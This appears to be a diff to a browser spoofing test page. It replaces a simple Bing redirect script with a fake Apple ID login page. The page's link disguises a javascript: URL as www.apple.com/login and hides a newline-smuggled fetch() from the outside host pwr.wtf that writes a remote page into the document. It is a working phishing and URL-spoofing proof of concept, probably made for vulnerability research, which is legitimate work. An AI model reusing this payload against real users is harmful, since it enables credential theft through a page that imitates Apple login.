@@ -1,9 +1,16 @@
-<script>  
-  function spoof() { 
-  document.write("<h1>This is not Bing</h1>");  
-  document.location = "https://bing.com:1234"; 
-    setInterval(function(){document.location="https://bing.com:1234";},9800); 
-  }; 
-</script> 
+<head>
+<meta name = "viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+<style>
+html,
+body {
+  overflow-x: hidden;
+  height: 100%;
+}
+body {
+  position: relative;
+}</style></head><body>
+<center><br><br><br><h3>Login using your Apple ID account:<br></h3>
 
-<p><input type="button" value="Run test case"  onclick="spoof();" /> 
+<h3><a href="javascript://www.apple.com/login?oauth=true&account&%0afetch('https://pwr.wtf/fakeapple.php').then(r=>{r.text().then(w=>{document.write(w)})})">apple.com<br>(Tap and Hold to Open in New Tab)</a>
+
+</script>
